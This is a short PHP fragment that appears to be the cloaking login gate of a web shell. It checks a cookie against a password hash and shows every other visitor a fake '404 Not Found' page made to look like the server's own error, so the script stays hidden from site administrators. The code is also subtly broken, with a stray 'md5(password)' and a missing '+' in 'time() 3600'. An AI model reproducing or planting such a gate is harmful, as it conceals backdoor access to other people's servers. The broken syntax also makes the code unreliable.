$s_show = ""; md5(password)

if(!isset($_COOKIE['show'])) {
setcookie("show","null",time() 3600);
}

if(kript($_COOKIE['show']) == $s_show) {
setcookie("show",md5($_SERVER['HTTP_USER_AGENT'].md5($_COOKIE['show']).$_SERVER['SCRIPT_NAME']),time() + 3600);
} else {
if($_COOKIE['show'] != md5($_SERVER['HTTP_USER_AGENT'].$s_show.$_SERVER['SCRIPT_NAME'])) {
?>
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL <?php echo $_SERVER['SCRIPT_NAME'];?> was not found on this server.</p> <hr> <address><?php echo $_SERVER['SERVER_SOFTWARE'];?> Server at <?php echo $_SERVER['HTTP_HOST']; ?> Port <?php echo $_SERVER['SERVER_PORT'];?></address> </body></html>
<?php
exit;
}} 
